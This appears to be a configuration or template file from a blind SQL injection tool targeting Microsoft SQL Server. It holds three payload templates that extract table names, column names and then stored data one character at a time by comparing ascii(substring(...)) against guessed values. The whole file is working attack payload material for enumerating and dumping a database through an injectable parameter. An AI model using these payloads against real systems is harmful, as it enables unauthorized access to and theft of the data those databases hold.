queries.get_tables: ascii(substring((SELECT name FROM sys.tables ORDER BY name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY), {pos}, 1)) = {ascii_val}
queries.get_columns: ascii(substring((SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table}') ORDER BY name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY), {pos}, 1)) = {ascii_val}
queries.dump_data: ascii(substring((SELECT CAST({column} AS VARCHAR) FROM {table} ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY), {pos}, 1)) = {ascii_val}
